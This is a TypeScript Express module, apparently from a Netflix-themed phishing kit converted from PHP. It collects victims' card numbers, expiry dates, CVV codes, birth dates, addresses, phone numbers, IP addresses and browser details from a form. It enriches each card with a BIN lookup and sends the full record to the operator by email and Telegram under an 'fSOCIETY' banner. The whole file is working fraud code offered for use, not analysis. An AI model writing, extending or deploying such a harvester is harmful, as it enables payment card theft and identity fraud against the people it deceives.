/**
 * Credit card data sender module
 * Converted from PHP send_carde.php
 */

import { Request, Response } from 'express';
import axios from 'axios';
import { emailNotifier } from './email.js';
import { telegramNotifier } from './telegram.js';

interface CardData {
    nameOnCard: string;
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    birthdate: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    phoneNumber: string;
    bankName: string;
    cardType: string;
    cardBrand: string;
    ip: string;
    country: string;
    os: string;
    browser: string;
    timestamp: string;
}

export async function sendCard(req: Request, res: Response): Promise<void> {
    try {
        const InfoDATE = new Date().toLocaleString('en-US', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });

        const userAgent = req.get('User-Agent') || '';
        const OS = getOS(userAgent);
        const browser = getBrowser(userAgent);

        // Collect card data from form
        const cardData: CardData = {
            nameOnCard: req.body.NameOnCard || '',
            cardNumber: req.body.cardnumber || '',
            expiryDate: req.body.expdate || '',
            cvv: req.body.Securitycode || '',
            birthdate: req.body.birthdate || '',
            address: req.body.addres || '',
            city: req.body.City || '',
            state: req.body.State || '',
            zipCode: req.body.zipCod || '',
            phoneNumber: req.body.phoneNumber || '',
            bankName: '',
            cardType: '',
            cardBrand: '',
            ip: req.ip || 'unknown',
            country: req.session.country1 || 'Unknown',
            os: OS,
            browser: browser,
            timestamp: InfoDATE
        };

        // Get BIN information
        const binInfo = await getBinInfo(cardData.cardNumber);
        if (binInfo) {
            cardData.bankName = binInfo.bank?.name || 'Unknown';
            cardData.cardType = binInfo.type?.toUpperCase() || 'Unknown';
            cardData.cardBrand = binInfo.brand?.toUpperCase() || 'Unknown';
        }

        // Store in session
        Object.assign(req.session, cardData);

        // Send notifications
        await sendCardNotifications(cardData);

        console.log('Card data sent successfully');
    } catch (error) {
        console.error('Error sending card data:', error);
    }
}

function getOS(userAgent: string): string {
    const osPatterns = [
        { pattern: /Windows NT 10/i, os: 'Windows 10' },
        { pattern: /Windows NT 6.3/i, os: 'Windows 8.1' },
        { pattern: /Windows NT 6.2/i, os: 'Windows 8' },
        { pattern: /Windows NT 6.1/i, os: 'Windows 7' },
        { pattern: /Windows NT 6.0/i, os: 'Windows Vista' },
        { pattern: /Windows NT 5.2/i, os: 'Windows Server 2003/XP x64' },
        { pattern: /Windows NT 5.1/i, os: 'Windows XP' },
        { pattern: /Windows XP/i, os: 'Windows XP' },
        { pattern: /Windows NT 5.0/i, os: 'Windows 2000' },
        { pattern: /Windows ME/i, os: 'Windows ME' },
        { pattern: /Win98/i, os: 'Windows 98' },
        { pattern: /Win95/i, os: 'Windows 95' },
        { pattern: /Win16/i, os: 'Windows 3.11' },
        { pattern: /Macintosh|Mac OS X/i, os: 'Mac OS X' },
        { pattern: /Mac_PowerPC/i, os: 'Mac OS 9' },
        { pattern: /Linux/i, os: 'Linux' },
        { pattern: /Ubuntu/i, os: 'Ubuntu' },
        { pattern: /iPhone/i, os: 'iPhone' },
        { pattern: /iPod/i, os: 'iPod' },
        { pattern: /iPad/i, os: 'iPad' },
        { pattern: /Android/i, os: 'Android' },
        { pattern: /BlackBerry/i, os: 'BlackBerry' },
        { pattern: /webOS/i, os: 'Mobile' }
    ];

    for (const { pattern, os } of osPatterns) {
        if (pattern.test(userAgent)) {
            return os;
        }
    }

    return "Unknown OS Platform";
}

function getBrowser(userAgent: string): string {
    const browserPatterns = [
        { pattern: /Chrome\/([0-9.]+)/, name: 'Chrome' },
        { pattern: /Firefox\/([0-9.]+)/, name: 'Firefox' },
        { pattern: /Safari\/([0-9.]+)/, name: 'Safari' },
        { pattern: /Opera\/([0-9.]+)/, name: 'Opera' },
        { pattern: /Edge\/([0-9.]+)/, name: 'Edge' },
        { pattern: /MSIE ([0-9.]+)/, name: 'Internet Explorer' }
    ];

    for (const { pattern, name } of browserPatterns) {
        const match = userAgent.match(pattern);
        if (match) {
            return `${name} ${match[1]}`;
        }
    }

    return 'Unknown Browser';
}

async function getBinInfo(cardNumber: string): Promise<any> {
    try {
        // Remove spaces and get first 8 digits for BIN
        const cleanNumber = cardNumber.replace(/\s/g, '');
        const bin = cleanNumber.substring(0, 8);

        const response = await axios.get(`https://lookup.binlist.net/${bin}`, {
            headers: {
                'Accept-Version': '3'
            }
        });

        return response.data;
    } catch (error) {
        console.error('Error getting BIN info:', error);
        return null;
    }
}

async function sendCardNotifications(cardData: CardData): Promise<void> {
    try {
        // Send email notification
        await emailNotifier.sendCardNotification(cardData);

        // Send Telegram notification
        const telegramMessage = `
[+]━━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 Card Bill 】━━━━━━━━━━━━━━[+]
[🎂 D.O.B ]              = ${cardData.birthdate}
[🗺 Address ]             = ${cardData.address}
[🌍 City ]               = ${cardData.city}
[🌎 State ]              = ${cardData.state}
[📮 zip Code ]              = ${cardData.zipCode}
[📞 Phone ]              = ${cardData.phoneNumber}
[+]━━━━━━━━━━━━━━━━【💳 Card INFO 】━━━━━━━━━━━━━━[+]
[👤 CardHolder Name]    = ${cardData.nameOnCard}
[💳 Credit Card Number] = ${cardData.cardNumber}
[🔄 Expiry Date ]       = ${cardData.expiryDate}
[🔑 CVV ]               = ${cardData.cvv}
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━[+]
[🏛 Card Bank]          = ${cardData.bankName}
[💳 Card type]          = ${cardData.cardType}
[💳 Card brand]         = ${cardData.cardBrand}
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP=${cardData.ip}
[⏰ TIME/DATE] = ${cardData.timestamp}
[🌐 BROWSER] = ${cardData.browser} and ${cardData.os}
[+]━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━━━━[+]
`;

        await telegramNotifier.sendMessage(telegramMessage);

        console.log('Card notifications sent successfully');
    } catch (error) {
        console.error('Error sending card notifications:', error);
    }
}